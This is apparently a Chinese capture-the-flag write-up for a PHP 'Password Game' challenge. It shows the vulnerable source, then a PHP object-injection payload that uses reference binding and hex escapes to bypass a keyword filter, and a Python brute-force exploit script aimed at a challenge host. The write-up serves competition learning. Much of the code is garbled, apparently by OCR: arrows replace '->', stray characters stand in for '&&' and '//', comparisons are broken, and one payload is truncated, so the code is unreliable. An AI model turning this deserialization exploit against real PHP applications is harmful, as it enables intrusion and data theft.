---
tags: [反序列化, 源码审计]
---

---
tags: [反序列化, 源码审计]
---

# Password Game

 

输入用户名后前几次访问会提⽰几个Rule

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml175892\wps1.jpg)  Rule 1: 密码包含大小写字母

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml175892\wps2.jpg)  Rule 2: 密码数字之和必须是某个随机数的倍数

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml175892\wps3.jpg)  Rule 3: 密码包含某一个计算式的结果

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml175892\wps4.jpg)  Rule 4: 密码长度不能大于 170 字符

当满足前三个条件后, 会给出部分 PHP 源码

 

```


<?php

function filter($password)

{

$filter_arr = array("admin " ,  "2024qwb") ;

$filter =  '/ '  . implode( " | " , $filter_arr)  .  '/i ' ;

return preg_replace($filter ,  "nonono " ,  $password) ; }

class guest

{

public  $username ;

public $value;

public function 一tostring()

{

echo  "tostring\n " ;

if  ($this→ username  =  "guest")  {

$value() ;

}

return $this→ username ;

}

public function 一call($key , $value)

{

echo  "call\n " ;

if  ($this→ username  =  md5($GLOBALS["flag"]))  { echo  $GLOBALS ["flag"] ;

}

}

}

class root

{

public  $username ;

public $value;

public function 一get($key)

{

echo "get\n " ;

if  (strpos($this→ username ,  "admin")  =  0 绥 $this→value  = "2024qwb")  {



$this→value = $GLOBALS["flag"];

echo md5("hello : "  .  $this→value) ;

}

}

}

class user

{

public  $username ;

public  $password;

public $value;

public function 一invoke()

{

echo "invoke\n " ;

$this→ username  =  md5($GLOBALS["flag"]);

return $this→ password→ guess();

}

public function 一destruct()

{

echo  "destruct\n " ;

if  (strpos($this→ username ,  "admin")  =  0 )  {

echo  "hello " .  $this→ username ;

}

}

}

 

$GLOBALS ["flag"] =  "flag{test} " ;

$user = unserialize(filter($_POST [ 'password ' ])) ;

if  (strpos($user→ username ,  "admin")  =  0  绥  $user→ password  =  "2024qwb")  { echo "hello ! " ;

}
```

 

 

利用 user 类 destruct 时的 echo 输出 flag, 通过引用将 user 的 username 属性和 root 的 value 属性绑定, 最后需要将 user 塞到 root 的随便一个属性里面 (这里用 x)

payload 如下

 

```
<?php

 

class guest

{

public  $username ;

public $value; }

class root

{

public  $username ;



public $value; }

class user

{

public  $username ;

public  $password;

public $value; }

 

 

$root  =  new root() ;

$user  = new  user () ;

 

$user→ username =  '2024qwb ' ;

$root→ username  =  'admin ' ;

$root→value  =  &$user→ username ;

$root→x  =  $user;

 

 

echo serialize($root) ;

 

\#  O :4 : "root " :3 :

{s:8: "username " ;S:5:"\61\64\6d\69\6e " ;s:5: "value " ;S:7:"\32\30\32\34\71\77\62 " ; s:1: "x " ;O:4: "user " :3:{s:8: "username " ;R:3;s:8: "password " ;N;s:5: "value " ;N; B
```

 

 

序列化的 payload 用 hex 绕过对 admin 和 qwb2024 这两个字符串过滤

exp 如下, 因为包含 payload 的 password 也需要满足以上四个条件, 所以这里采用爆破的方式, 跑一会有一定概率能拿到 flag

 

```


import  requests

import re

 

def  make_number_count_to(base ,  n ) :

base  =  str(base)

t = 0

for i in base :

t += int(i )

a = n - (t % n )

b = a % 9

c = a Ⅱ 9

return  [ '9 ' ] *  c + [str(b )]

 

url =  'http:Ⅱeci-2ze762llzxw5rib39m3o.cloudeci1.ichunqiu.com'

 

def main() :



s =  requests .Session()

 

s .get(url +  '/index .php ')

s .post(url +  '/index .php?action=start ' ,  data={

'name ' :  '1234 '

})

 

\# Rule 1

resp  =  s .post(url  +  '/game .php ' ,  data={

'password ' :  'Abcd23451 '

})

 

\# Rule 2

n = int(re .findall(r "(\d+)的倍数 " ,resp.text) [0 ])

ans  =  ' ' .join(make_number_count_to(0 , n ))

 

resp  =  s .post(url  +  '/game .php ' ,  data={

'password ' :  'Abc '  +  ans

})

 

\# Rule 3

expr = resp.text .split('\n ') [-1] .strip() .replace('/ ' ,  ' Ⅱ ')

ans__1  =  eval(expr)

ans_2  =  ' ' .join(make_number_count_to(ans__1 ,  n ))

 

resp  =  s .post(url  +  '/game .php ' ,  data={

'password ' :  'Abc '  +  str(ans__1 )  +  ans_2

})

 

\#  get flag

 

\# 4 + 2 + 8 + 5 + 2 + 8 + 5 + 5 + 1 + 8 + 5 + 1 + 8 + 2 = 64

 

payload  =  r 'O :4 : "root " :3 :

{s:8: "username " ;S:5:"\61\64\6d\69\6e " ;s:5: "value " ;S:7:"\32\30\32\34\71\77\62 " ;

s:1: "x " ;O:4: "user " :3:{s:8: "username " ;R:3;s:8: "password " ;N;s:5: "value " ;N; B ' ans_3  =  ' ' .join(make_number_count_to(ans__1 ,  n  -  64))

 

resp  =  s .post(url  +  '/game .php ' ,  data={

'password ' :  payload  +  str(ans__1 )  +  ans_3

})

 

print(resp.text)

 

while True :

try :

main()



except  IndexError :

pass
```

